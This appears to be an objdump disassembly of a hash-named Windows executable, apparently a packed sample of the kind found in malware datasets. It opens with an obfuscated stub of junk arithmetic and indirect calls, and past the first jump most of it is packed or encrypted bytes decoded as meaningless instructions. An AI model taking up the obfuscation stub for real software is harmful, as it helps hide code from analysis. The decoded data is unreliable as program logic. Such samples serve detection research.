
9d3cbb8db217aa98304b899dc2ee78849d0e893a5527aa8f703fb28a91794dc7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401070
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	jg     0x401070
  40103e:	jmp    0x40105e
  401043:	push   0x1
  401045:	push   0x4b7c
  40104a:	push   DWORD PTR [ebp-0x28]
  40104d:	push   DWORD PTR [ebp-0x1c]
  401050:	push   0x4108
  401055:	push   DWORD PTR [ebp-0xc]
  401058:	call   DWORD PTR ds:0x42a3c2
  40105e:	mov    ecx,DWORD PTR ds:0x42a266
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x42a266,ecx
  40106b:	jmp    0x401024
  401070:	push   edi
  401071:	mov    esi,0x75108aa
  401076:	sbb    DWORD PTR ds:0x42a266,0x4c4b
  401080:	xor    eax,esi
  401082:	and    DWORD PTR ds:0x42a26e,0x59cd
  40108c:	mov    edi,0x3272f1
  401091:	mov    ecx,DWORD PTR ds:0x42a26a
  401097:	sbb    ecx,DWORD PTR ds:0x42a2aa
  40109d:	mov    DWORD PTR ds:0x42a26a,ecx
  4010a3:	add    eax,edi
  4010a5:	and    DWORD PTR ds:0x42a296,0x0
  4010af:	jmp    0x4010c3
  4010b4:	xor    ecx,ecx
  4010b6:	xor    ecx,DWORD PTR ds:0x42a296
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42a296,ecx
  4010c3:	cmp    DWORD PTR ds:0x42a296,0x1e
  4010ca:	jae    0x401113
  4010d0:	cmp    DWORD PTR ds:0x42a296,0xe
  4010d7:	ja     0x401113
  4010dd:	jmp    0x4010f2
  4010e2:	push   0x42a25e
  4010e7:	push   0x42916d
  4010ec:	call   DWORD PTR ds:0x42a3ca
  4010f2:	cmp    DWORD PTR ds:0x42a296,0xd
  4010f9:	jne    0x40110e
  4010ff:	xor    ecx,ecx
  401101:	or     ecx,DWORD PTR ds:0x42a296
  401107:	inc    ecx
  401108:	mov    DWORD PTR ds:0x42a296,ecx
  40110e:	jmp    0x4010b4
  401113:	mov    DWORD PTR [ebp-0x40],eax
  401116:	mov    eax,ds:0x42a2ca
  40111b:	sbb    DWORD PTR ds:0x42a25a,eax
  401121:	mov    eax,ds:0x42929e
  401126:	sub    DWORD PTR ds:0x42a2fa,ecx
  40112c:	mov    eax,DWORD PTR [eax]
  40112e:	mov    DWORD PTR [ebp-0x3c],eax
  401131:	inc    eax
  401132:	mov    eax,ds:0x4294ae
  401137:	and    DWORD PTR ds:0x42a26a,0x0
  401141:	jmp    0x401153
  401146:	mov    ecx,DWORD PTR ds:0x42a26a
  40114c:	inc    ecx
  40114d:	mov    DWORD PTR ds:0x42a26a,ecx
  401153:	cmp    DWORD PTR ds:0x42a26a,0x1f
  40115a:	jae    0x40119f
  401160:	cmp    DWORD PTR ds:0x42a26a,0x4
  401167:	jge    0x40119f
  40116d:	jmp    0x401180
  401172:	push   DWORD PTR [ebp-0x18]
  401175:	push   0x42a2c6
  40117a:	call   DWORD PTR ds:0x42a3ce
  401180:	cmp    DWORD PTR ds:0x42a26a,0x3
  401187:	jne    0x40119a
  40118d:	mov    ecx,DWORD PTR ds:0x42a26a
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a26a,ecx
  40119a:	jmp    0x401146
  40119f:	mov    eax,DWORD PTR [eax]
  4011a1:	add    ecx,0x507d
  4011a7:	mov    DWORD PTR [ebp-0x1c],eax
  4011aa:	xor    ecx,0x7815
  4011b0:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  4011b7:	or     DWORD PTR ds:0x42a2da,0x4fa4
  4011c1:	mov    eax,DWORD PTR [ebp-0x34]
  4011c4:	xor    eax,esi
  4011c6:	sub    ecx,DWORD PTR ds:0x42a2ce
  4011cc:	add    eax,edi
  4011ce:	and    DWORD PTR ds:0x42a266,edi
  4011d4:	mov    DWORD PTR [ebp-0x40],eax
  4011d7:	mov    eax,ds:0x42941e
  4011dc:	mov    DWORD PTR [ebp-0x40],eax
  4011df:	xor    eax,0x2e62
  4011e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4011e7:	mov    DWORD PTR [ebp-0x14],eax
  4011ea:	and    DWORD PTR ds:0x42a2de,0x0
  4011f4:	xor    ecx,ecx
  4011f6:	xor    ecx,DWORD PTR ds:0x42a2de
  4011fc:	inc    ecx
  4011fd:	mov    DWORD PTR ds:0x42a2de,ecx
  401203:	cmp    DWORD PTR ds:0x42a2de,0xb
  40120a:	ja     0x401250
  401210:	jmp    0x401229
  401215:	push   DWORD PTR [ebp-0x14]
  401218:	push   0x42a25e
  40121d:	push   DWORD PTR [ebp-0x18]
  401220:	push   DWORD PTR [ebp-0x20]
  401223:	call   DWORD PTR ds:0x42a3d2
  401229:	cmp    DWORD PTR ds:0x42a2de,0xa
  401230:	jne    0x401243
  401236:	mov    ecx,DWORD PTR ds:0x42a2de
  40123c:	inc    ecx
  40123d:	mov    DWORD PTR ds:0x42a2de,ecx
  401243:	cmp    DWORD PTR ds:0x42a2de,0x12
  40124a:	jb     0x4011f4
  401250:	mov    eax,DWORD PTR [ebp-0x14]
  401253:	adc    DWORD PTR ds:0x42a2ee,edx
  401259:	push   0x4
  40125b:	pop    ecx
  40125c:	or     DWORD PTR ds:0x42a256,0x42a2ba
  401266:	sub    ecx,eax
  401268:	and    DWORD PTR ds:0x42a2ae,edx
  40126e:	add    ecx,DWORD PTR [ebp-0x1c]
  401271:	sub    DWORD PTR ds:0x42a25a,0x29a3
  40127b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401282:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  40128c:	mov    DWORD PTR [ebp-0x18],ecx
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42a2c2
  401297:	or     DWORD PTR ds:0x42a276,eax
  40129d:	jmp    0x4035f6
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	cdq    
  4012a4:	and    DWORD PTR [ebx],edx
  4012a6:	add    DWORD PTR [ebx+0x10ba9981],ecx
  4012ac:	cwde   
  4012ad:	int    0x2a
  4012af:	aad    0x50
  4012b1:	in     al,0x83
  4012b3:	add    DWORD PTR [ebx-0x7ca1b87d],0xffffff83
  4012ba:	and    al,0x2d
  4012bc:	cmp    BYTE PTR es:[eax],ah
  4012bf:	xor    al,0x22
  4012c1:	cs je  0x401301
  4012c4:	jo     0x40133d
  4012c6:	loope  0x40133f
  4012c8:	jae    0x40133d
  4012ca:	ins    BYTE PTR es:[edi],dx
  4012cb:	dec    ebx
  4012cc:	aam    0xdd
  4012ce:	clc    
  4012cf:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	pusha  
  4012d8:	into   
  4012d9:	pop    esp
  4012da:	push   ebx
  4012db:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012e1:	dec    esp
  4012e2:	jle    0x40132a
  4012e4:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012ea:	sub    eax,0x3dd77fe
  4012ef:	push   0x7e
  4012f1:	pop    ds
  4012f2:	in     al,dx
  4012f3:	inc    eax
  4012f4:	int3   
  4012f5:	ret    
  4012f6:	in     al,dx
  4012f7:	xchg   esi,eax
  4012f8:	sub    bl,bh
  4012fa:	xchg   edx,eax
  4012fb:	xor    BYTE PTR [esi],cl
  4012fd:	pusha  
  4012fe:	mov    dl,0x93
  401300:	aad    0x6
  401302:	ins    BYTE PTR es:[edi],dx
  401303:	fcom   QWORD PTR ds:0x37030fe5
  401309:	and    DWORD PTR [ecx+0xd],edx
  40130c:	aaa    
  40130d:	jb     0x401380
  40130f:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  401316:	lock push eax
  401318:	xor    al,BYTE PTR [ebp+0x62d14b]
  40131e:	and    eax,DWORD PTR [ebx]
  401320:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  40132a:	fwait
  40132b:	dec    eax
  40132c:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401332:	jecxz  0x401360
  401334:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40133c:	xor    BYTE PTR [eax-0x6e323937],dl
  401342:	push   0x4d6b54f5
  401347:	or     eax,0x1a470a3f
  40134c:	lods   al,BYTE PTR ds:[esi]
  40134d:	push   edx
  40134e:	shl    DWORD PTR [esi+0x6715d949],cl
  401354:	cld    
  401355:	imul   esp,DWORD PTR [edi-0x4c],0x0
  401359:	jno    0x401319
  40135b:	add    DWORD PTR [ebx+0x26],ebx
  40135e:	push   ecx
  40135f:	inc    esi
  401360:	mov    al,0x60
  401362:	cmp    ch,BYTE PTR [eax]
  401364:	popf   
  401365:	arpl   WORD PTR [ecx+0x4],dx
  401368:	aas    
  401369:	mov    esp,ebp
  40136b:	add    eax,0xde3c803c
  401370:	or     esi,ecx
  401372:	(bad)  
  401373:	xor    ch,BYTE PTR [ebp-0xf5b6069]
  401379:	cmp    bl,dh
  40137b:	dec    edi
  40137c:	sbb    esi,DWORD PTR cs:[edx+0x726e4d92]
  401383:	mov    bh,0x35
  401385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401386:	ret    0x8d3b
  401389:	stc    
  40138a:	mov    ebx,0x61c18e8c
  40138f:	add    bh,ch
  401391:	xchg   ebp,eax
  401392:	push   eax
  401393:	shl    DWORD PTR [edi-0x294a5c80],0x50
  40139a:	mov    edi,DWORD PTR [ebx-0x15]
  40139d:	push   cs
  40139e:	cmp    eax,0xa59c7121
  4013a3:	add    BYTE PTR [edx-0x32c5a9c1],bh
  4013a9:	sub    esp,DWORD PTR [eax-0xc5ee33e]
  4013af:	cmp    al,0xb7
  4013b1:	in     al,dx
  4013b2:	push   edx
  4013b3:	dec    esi
  4013b4:	mov    ds:0x3bff4d39,al
  4013b9:	lods   eax,DWORD PTR ds:[esi]
  4013ba:	(bad)  
  4013bc:	xchg   ecx,eax
  4013bd:	loope  0x401430
  4013bf:	sbb    ebx,DWORD PTR [edx+0x162da734]
  4013c5:	pop    esp
  4013c6:	mov    dh,dh
  4013c8:	cmp    eax,0xa18dce9f
  4013cd:	xor    eax,0xce48e579
  4013d2:	mov    cl,0x1
  4013d4:	xchg   esp,eax
  4013d5:	shr    ebp,0x98
  4013d8:	sbb    bl,BYTE PTR [eax+0x53663d8e]
  4013de:	addr16 jmp 0x1c34:0xfca9e77c
  4013e6:	mov    eax,0x15ee5ef3
  4013eb:	push   edi
  4013ec:	or     BYTE PTR [ebx],cl
  4013ee:	mov    bl,BYTE PTR [esi]
  4013f0:	mov    eax,DWORD PTR [esi-0x619e8235]
  4013f6:	aas    
  4013f7:	xchg   esp,eax
  4013f8:	(bad)  
  4013f9:	fldln2 
  4013fb:	scas   al,BYTE PTR es:[edi]
  4013fc:	retf   
  4013fd:	and    al,0xb9
  4013ff:	inc    edi
  401400:	jno    0x401432
  401402:	int3   
  401403:	js     0x401388
  401405:	dec    esi
  401406:	pop    ds
  401407:	sbb    BYTE PTR [ebx],ch
  401409:	xchg   ebp,eax
  40140a:	aam    0xdd
  40140c:	xor    eax,0xcfe782a
  401411:	leave  
  401412:	iret   
  401413:	dec    edx
  401414:	arpl   WORD PTR [ecx+0x5272ebc0],ax
  40141a:	inc    ebx
  40141b:	pop    esp
  40141c:	xor    edx,esp
  40141e:	dec    esp
  40141f:	mov    al,0xf5
  401421:	xchg   bl,ch
  401423:	rol    edx,cl
  401425:	enter  0x2bc2,0x5f
  401429:	les    eax,FWORD PTR [eax-0x55]
  40142c:	ds dec ecx
  40142e:	fldenv [eax]
  401430:	repnz inc edi
  401432:	jnp    0x401437
  401434:	pop    ds
  401435:	push   cs
  401436:	daa    
  401437:	mov    BYTE PTR [esi+0x25],ah
  40143a:	cmp    DWORD PTR [ecx],edx
  40143c:	(bad)  [ebp+0x78]
  40143f:	push   es
  401440:	shl    ch,1
  401442:	push   ebx
  401443:	cmc    
  401444:	cmp    BYTE PTR [ecx-0x35ef1fe5],ch
  40144a:	ret    
  40144b:	mov    BYTE PTR [edi-0x3483d10f],dh
  401451:	mov    al,0x75
  401453:	or     edi,DWORD PTR [ebx-0x33]
  401456:	hlt    
  401457:	icebp  
  401458:	es cli 
  40145a:	xchg   ebp,eax
  40145b:	mov    ecx,0x638c0fda
  401460:	adc    ah,cl
  401462:	je     0x40141d
  401464:	jle    0x401451
  401466:	xor    edx,DWORD PTR [ebp+0x44]
  401469:	inc    eax
  40146a:	sbb    eax,esp
  40146c:	push   cs
  40146d:	mov    ecx,0x21b1743f
  401472:	sub    esp,eax
  401474:	lock cwde 
  401476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401477:	mov    dl,0x90
  401479:	loop   0x401421
  40147b:	push   esi
  40147c:	clc    
  40147d:	push   0x33
  40147f:	add    DWORD PTR ss:[ecx+esi*4-0x50],ecx
  401484:	das    
  401485:	push   ss
  401486:	xchg   ecx,edx
  401488:	dec    ecx
  401489:	inc    edi
  40148a:	mov    ebx,0xde9383b6
  40148f:	mov    eax,ds:0xbc34caa0
  401494:	mov    al,0xc8
  401496:	sub    cl,BYTE PTR [ebx]
  401498:	cdq    
  401499:	ins    DWORD PTR es:[edi],dx
  40149a:	mov    dl,0xcb
  40149c:	push   esp
  40149d:	mov    al,BYTE PTR [ebx-0x757fe95c]
  4014a3:	push   0xffffffe8
  4014a5:	int    0xe2
  4014a7:	adc    DWORD PTR [eax],ebp
  4014a9:	lds    ebp,FWORD PTR [edi]
  4014ab:	mov    cl,BYTE PTR [edx+0x62]
  4014ae:	jle    0x4014b1
  4014b0:	xchg   edx,eax
  4014b1:	mov    dh,0xe8
  4014b3:	aas    
  4014b4:	retf   0xe17e
  4014b7:	leave  
  4014b8:	std    
  4014b9:	(bad)  
  4014ba:	cmc    
  4014bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bc:	out    0x75,eax
  4014be:	add    DWORD PTR [edx-0x61b2cdc7],ebp
  4014c4:	push   ecx
  4014c5:	cwde   
  4014c6:	xchg   DWORD PTR [eax+edi*8-0x35cd7d4b],ebp
  4014cd:	mov    al,0xc4
  4014cf:	adc    dl,dl
  4014d1:	cwde   
  4014d2:	cmp    BYTE PTR [ecx+ecx*4-0x7632ad28],dl
  4014d9:	adc    DWORD PTR [ecx-0x6e],0x7e36fe04
  4014e0:	xchg   ebx,eax
  4014e1:	jnp    0x401476
  4014e3:	stc    
  4014e4:	shr    BYTE PTR ds:0x9cbbd036,0x4b
  4014eb:	mov    al,0x1f
  4014ed:	mov    edi,0x1e0c1614
  4014f2:	or     eax,0xa71f2c83
  4014f7:	into   
  4014f8:	cld    
  4014f9:	sbb    al,0x2a
  4014fb:	push   eax
  4014fc:	pop    eax
  4014fd:	pop    edx
  4014fe:	iret   
  4014ff:	mov    ch,0x58
  401501:	cmp    ch,BYTE PTR [eax+0x54]
  401504:	enter  0x3e7b,0xfe
  401508:	pop    ss
  401509:	push   ecx
  40150a:	push   ebp
  40150b:	dec    ecx
  40150c:	mov    cl,0x22
  40150e:	pop    edx
  40150f:	pop    ebx
  401510:	inc    ebp
  401511:	sub    DWORD PTR [eax-0x7e],esp
  401514:	cli    
  401515:	sub    al,BYTE PTR [ebp+0x77e3f880]
  40151b:	dec    esp
  40151c:	pop    ecx
  40151d:	push   ds
  40151e:	(bad)  
  40151f:	ja     0x4014af
  401521:	and    al,0x60
  401523:	sub    ah,BYTE PTR [edi+0x1664543]
  401529:	add    al,0xf4
  40152b:	xlat   BYTE PTR ds:[ebx]
  40152c:	aam    0x2e
  40152e:	and    al,0x1c
  401530:	sar    BYTE PTR [ecx],1
  401532:	and    al,0xe4
  401534:	cmp    ebp,DWORD PTR [edi-0x24]
  401537:	mov    ebp,0x6a9b5555
  40153c:	shl    BYTE PTR ds:0x62b641d8,0xb
  401543:	in     al,dx
  401544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401545:	and    DWORD PTR [ecx-0x56],ebp
  401548:	or     BYTE PTR [esi-0x6a],0x75
  40154c:	add    DWORD PTR [edi+0x33dc69cc],edx
  401552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401553:	jge    0x401594
  401555:	mov    ds:0xc88d39c9,al
  40155a:	mov    ebx,0x3ad78e57
  40155f:	pop    ecx
  401560:	lahf   
  401561:	call   0xce8a:0x729217a9
  401568:	stos   DWORD PTR es:[edi],eax
  401569:	mov    edi,0xb948e589
  40156e:	in     al,dx
  40156f:	add    al,0x6b
  401571:	mov    DWORD PTR [ebx],ebp
  401573:	and    ebx,DWORD PTR [edx+0xf004289]
  401579:	mov    esi,0xce66dc2b
  40157e:	jbe    0x401598
  401580:	and    ebp,DWORD PTR [eax]
  401582:	test   eax,0x918da9f9
  401587:	(bad)  
  401588:	sbb    al,ch
  40158a:	fs xchg ebx,eax
  40158c:	cmp    edi,edi
  40158e:	or     BYTE PTR [ebx+0x51e132a5],0x19
  401595:	mov    cl,0x47
  401597:	fsub   DWORD PTR [ecx-0x3b]
  40159a:	xor    dh,0x72
  40159d:	repz shl BYTE PTR [ebx-0x6e],1
  4015a1:	retf   
  4015a2:	sub    esp,0x4661a624
  4015a8:	cmp    DWORD PTR [ebp+ebp*8+0x5a],edx
  4015ac:	(bad)  
  4015ad:	fstp   QWORD PTR [esi]
  4015af:	test   DWORD PTR [edx+0x25],edx
  4015b2:	sub    BYTE PTR [ecx-0x3b],0x28
  4015b6:	jp     0x4015ce
  4015b8:	push   ebp
  4015b9:	addr16 jb 0x4015c1
  4015bc:	cli    
  4015bd:	adc    bh,al
  4015bf:	jecxz  0x40159b
  4015c1:	adc    eax,0x4e363daf
  4015c6:	test   al,0x9b
  4015c8:	mov    DWORD PTR [edi+edx*2],0xfec9b637
  4015cf:	adc    bl,BYTE PTR [edi-0x6e]
  4015d2:	adc    bh,BYTE PTR ds:0x18fd17c3
  4015d8:	aam    0xbd
  4015da:	cld    
  4015db:	sbb    eax,0xaa45cab7
  4015e0:	je     0x40165c
  4015e2:	and    eax,0x12e94a9d
  4015e7:	lock mov edx,0x3dacb0bf
  4015ed:	and    eax,0x96e3f009
  4015f2:	jp     0x4015e7
  4015f4:	sar    DWORD PTR [ecx+0x238b997d],1
  4015fa:	dec    esi
  4015fb:	mov    edi,0x3c7a3203
  401600:	test   DWORD PTR [ebx+eax*1],0x142d39a8
  401607:	js     0x4015f8
  401609:	pop    ds
  40160a:	xor    ecx,DWORD PTR [ebp+0x56]
  40160d:	xor    al,0x11
  40160f:	cwde   
  401610:	icebp  
  401611:	add    dl,BYTE PTR [esi+eax*2]
  401614:	ret    
  401615:	and    DWORD PTR [edi+0x60],edi
  401618:	inc    ebx
  401619:	mov    esp,DWORD PTR [esp+ecx*4]
  40161c:	sbb    BYTE PTR [eax],ah
  40161e:	lods   al,BYTE PTR ds:[esi]
  40161f:	cs inc ebp
  401621:	mov    ah,0x28
  401623:	push   ss
  401624:	adc    al,0xda
  401626:	cmp    al,0xe
  401628:	outs   dx,BYTE PTR ds:[esi]
  401629:	(bad)  
  40162a:	sbb    ebp,0x3f
  40162d:	add    ah,ch
  40162f:	dec    ecx
  401630:	xchg   esi,eax
  401631:	iret   
  401632:	cmp    edi,eax
  401634:	push   eax
  401635:	mov    BYTE PTR [edi-0x7a],dh
  401638:	clc    
  401639:	pop    ebx
  40163a:	add    DWORD PTR [edi],ebx
  40163c:	adc    esi,0x7ca76701
  401642:	dec    esp
  401643:	xchg   esi,eax
  401644:	jge    0x401649
  401646:	cmp    ecx,DWORD PTR [esi+0x33]
  401649:	cld    
  40164a:	cmp    BYTE PTR [ebx-0x576814bf],bl
  401650:	cmp    al,0xfb
  401652:	jmp    0x7f9c:0xb24ad346
  401659:	fidivr DWORD PTR ds:0x775cc01d
  40165f:	std    
  401660:	inc    esp
  401661:	pop    esi
  401663:	outs   dx,DWORD PTR ds:[esi]
  401664:	or     edx,DWORD PTR [ebx+ebp*2-0x16]
  401668:	inc    edi
  401669:	(bad)  
  40166a:	lds    eax,FWORD PTR [edi+0xd8d649a]
  401670:	imul   esi,DWORD PTR [edx],0xffffffea
  401673:	cld    
  401674:	adc    ah,BYTE PTR [edx+eax*4]
  401677:	mov    cl,0xc1
  401679:	loop   0x401642
  40167b:	fild   DWORD PTR [esi+0x3d]
  40167e:	stos   BYTE PTR es:[edi],al
  40167f:	fsubr  QWORD PTR [edx]
  401681:	les    edx,FWORD PTR [ecx]
  401683:	cdq    
  401684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401685:	inc    eax
  401686:	ja     0x401655
  401688:	xchg   DWORD PTR [edx-0x251ac3d5],ebx
  40168e:	inc    ebx
  40168f:	pushf  
  401690:	sub    eax,0x7106cb38
  401695:	xlat   BYTE PTR ds:[ebx]
  401696:	and    bh,dh
  401698:	pop    esi
  401699:	push   ebx
  40169a:	sbb    eax,0xd4afaef1
  40169f:	repz jge 0x4016a0
  4016a2:	test   eax,0x57156936
  4016a7:	out    0x80,al
  4016a9:	cmp    eax,DWORD PTR [ebx-0x15ce607a]
  4016af:	mov    esp,0xcb04f67c
  4016b4:	out    0x13,al
  4016b6:	add    edx,DWORD PTR [edx-0x55]
  4016b9:	das    
  4016ba:	int3   
  4016bb:	pop    ds
  4016bc:	addr16 (bad) 
  4016be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016bf:	and    BYTE PTR [ebp+0x55],bh
  4016c2:	xor    ebp,DWORD PTR [bx]
  4016c5:	ds dec ecx
  4016c7:	xchg   BYTE PTR [eax+0x6b],bl
  4016ca:	jecxz  0x40168e
  4016cc:	mov    bl,0xd1
  4016ce:	jno    0x401706
  4016d0:	iret   
  4016d1:	or     edx,eax
  4016d3:	push   ss
  4016d4:	ret    
  4016d5:	jg     0x4016df
  4016d7:	fcom   DWORD PTR [esi-0x54]
  4016da:	test   dh,0x2b
  4016dd:	pusha  
  4016de:	in     eax,0xda
  4016e0:	jmp    0x9b7238
  4016e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e6:	jno    0x401685
  4016e8:	add    dh,BYTE PTR [ecx]
  4016ea:	cld    
  4016eb:	sbb    edi,DWORD PTR [esi]
  4016ed:	call   0x759a:0x510fb7c4
  4016f4:	jbe    0x4016ca
  4016f6:	adc    al,0xf5
  4016f8:	out    0x4f,eax
  4016fa:	mov    ds:0xa8ecee6a,eax
  4016ff:	pop    esp
  401700:	push   ebx
  401701:	popa   
  401702:	add    eax,0x55d9ea13
  401707:	xor    al,0xf8
  401709:	adc    DWORD PTR [esi+0x32],esp
  40170c:	mov    dh,0x5e
  40170e:	cmp    al,0x6a
  401710:	push   0xffffffcd
  401712:	xrelease mov BYTE PTR [ebx+edi*8],bl
  401716:	aas    
  401717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401718:	ins    BYTE PTR es:[edi],dx
  401719:	push   ebx
  40171a:	sbb    bl,dh
  40171c:	add    cl,BYTE PTR [ecx-0x536fc193]
  401722:	pop    edx
  401723:	not    DWORD PTR [eax]
  401725:	mov    bh,0x8
  401727:	dec    edi
  401728:	sub    bl,BYTE PTR [ebp-0x23]
  40172b:	call   0x8510:0x8761
  401731:	jbe    0x401733
  401733:	ins    BYTE PTR es:[edi],dx
  401734:	inc    eax
  401735:	je     0x401778
  401737:	popf   
  401738:	and    eax,0x3bd35b80
  40173d:	lock cs jno 0x401701
  401741:	(bad)  
  401742:	mov    eax,0x6955dffe
  401747:	mov    BYTE PTR [eax+0x1c81451f],0x5e
  40174e:	rcl    DWORD PTR [ecx-0x68d5f67c],0xac
  401755:	ja     0x40171f
  401757:	sbb    BYTE PTR [ecx],ah
  401759:	xor    sp,WORD PTR ds:0x703fb29c
  401760:	(bad)  
  401761:	pop    ds
  401762:	jmp    0x48d5:0x9a174ebc
  401769:	push   ebx
  40176a:	arpl   WORD PTR [ebp-0x22955df4],si
  401770:	scas   eax,DWORD PTR es:[edi]
  401771:	and    eax,0x1531247d
  401776:	aam    0xc1
  401778:	nop
  401779:	popa   
  40177a:	fadd   QWORD PTR [edx-0x64634b4a]
  401780:	mov    edi,0x90d0a5ac
  401785:	cmc    
  401786:	scas   al,BYTE PTR es:[edi]
  401787:	mov    ebx,0xa78cf93c
  40178c:	rcl    DWORD PTR [ebp+0x56],0xee
  401790:	mov    al,ds:0xe263f126
  401795:	xor    ch,cl
  401797:	in     eax,0x16
  401799:	pop    esp
  40179a:	pop    esp
  40179b:	jbe    0x4017c3
  40179d:	mov    cl,0x53
  40179f:	mov    ch,0x5
  4017a1:	aad    0x97
  4017a3:	pop    ss
  4017a4:	sbb    BYTE PTR [ecx],ch
  4017a6:	and    ebp,ecx
  4017a8:	ja     0x40174a
  4017aa:	jmp    0x401800
  4017ac:	(bad)  
  4017ad:	mov    eax,0x679b6d90
  4017b2:	dec    ecx
  4017b3:	push   0x8e29111c
  4017b8:	mov    ch,0xc8
  4017ba:	lds    edx,FWORD PTR [eax+0xb]
  4017bd:	mov    edx,0xa04334b6
  4017c2:	cmp    eax,0x474dbab2
  4017c7:	xchg   ebp,eax
  4017c8:	push   cs
  4017c9:	add    dh,BYTE PTR [esp+edx*4+0x68628f7c]
  4017d0:	mov    BYTE PTR [ebx-0x20a39d2a],dh
  4017d6:	dec    ecx
  4017d7:	out    dx,eax
  4017d8:	repz retf 
  4017da:	stos   DWORD PTR es:[edi],eax
  4017db:	pop    ecx
  4017dc:	lock (bad) 
  4017de:	lock fcom QWORD PTR ds:0x6f1bc0e8
  4017e5:	pop    esi
  4017e6:	pop    ecx
  4017e7:	jg     0x4017d6
  4017e9:	(bad)  
  4017ec:	lea    ebx,[ebp+0x6bc54913]
  4017f2:	dec    esp
  4017f3:	in     al,0xf8
  4017f5:	adc    ecx,DWORD PTR [ebp+0x58]
  4017f8:	mov    edi,0x9c211c26
  4017fd:	jmp    0x8e98:0x98ef9209
  401804:	pop    edi
  401805:	cmp    bl,BYTE PTR gs:[ecx-0x65]
  401809:	mov    BYTE PTR [ebx+0x1671aea3],al
  40180f:	xor    edi,DWORD PTR [ecx]
  401811:	xchg   edx,eax
  401812:	xor    ebp,esp
  401814:	pop    esi
  401815:	mov    ebp,0xd2124257
  40181a:	in     al,0xc0
  40181c:	xchg   ecx,eax
  40181d:	pop    ebx
  40181e:	pop    esi
  40181f:	sbb    BYTE PTR gs:[ecx+ebp*2],bh
  401823:	sti    
  401824:	(bad)  
  401825:	pop    ds
  401826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401827:	js     0x40182b
  401829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40182a:	xchg   edi,eax
  40182b:	sar    DWORD PTR [esi-0x70834a28],1
  401831:	and    BYTE PTR ds:0x4bb1f3e1,ah
  401837:	mov    al,0xa6
  401839:	or     ecx,DWORD PTR [esi]
  40183b:	pop    edi
  40183c:	ret    
  40183d:	imul   ebx,eax,0x941e5a5f
  401843:	jmp    0xf0e3:0x26532d71
  40184a:	cmc    
  40184b:	push   edx
  40184c:	mov    cl,0x5a
  40184e:	push   ecx
  40184f:	(bad)
  401854:	jae    0x401811
  401856:	jns    0x40189b
  401858:	aam    0x15
  40185a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40185b:	dec    ecx
  40185c:	ss int 0x6f
  40185f:	mov    bl,0xde
  401861:	and    BYTE PTR [esi+0x2543aa0b],bh
  401867:	popf   
  401868:	pusha  
  401869:	and    DWORD PTR [ecx+0x7d],ebx
  40186c:	dec    edi
  40186d:	sahf   
  40186e:	pusha  
  40186f:	scas   al,BYTE PTR es:[edi]
  401870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401871:	out    dx,eax
  401872:	xor    ah,cl
  401874:	retf   0xced5
  401877:	(bad)  
  401879:	ins    DWORD PTR es:[edi],dx
  40187a:	inc    ecx
  40187b:	les    edi,FWORD PTR [bx]
  40187e:	bound  edx,QWORD PTR [esi+0x3c]
  401881:	out    0x66,eax
  401883:	push   ecx
  401884:	mov    ?,WORD PTR [esi]
  401886:	jmp    0xfa812677
  40188b:	xor    DWORD PTR [edx],ebx
  40188d:	scas   eax,DWORD PTR es:[edi]
  40188e:	and    DWORD PTR [eax],ebx
  401890:	pushf  
  401891:	rcr    DWORD PTR [ebx+eiz*1+0x414b9fe],cl
  401898:	pop    esp
  401899:	fiadd  DWORD PTR [esi+0x7a]
  40189c:	xchg   esp,eax
  40189d:	cld    
  40189e:	pop    ds
  40189f:	jmp    0x401916
  4018a1:	xor    eax,0x4041282a
  4018a6:	rol    BYTE PTR [edi+0x49],cl
  4018a9:	icebp  
  4018aa:	push   es
  4018ab:	dec    ebx
  4018ac:	scas   eax,DWORD PTR es:[edi]
  4018ad:	xchg   esi,eax
  4018ae:	sahf   
  4018af:	xchg   ebx,eax
  4018b0:	idiv   DWORD PTR [edi+0x2e]
  4018b3:	push   0x15ae21a2
  4018b8:	pop    eax
  4018b9:	js     0x401874
  4018bb:	mov    BYTE PTR [ecx-0x7fe22110],ch
  4018c1:	cmp    al,0xb9
  4018c3:	sub    eax,0xf870be82
  4018c8:	cld    
  4018c9:	pop    ecx
  4018ca:	(bad)  [edi]
  4018cc:	dec    eax
  4018cd:	aaa    
  4018ce:	ss push ds
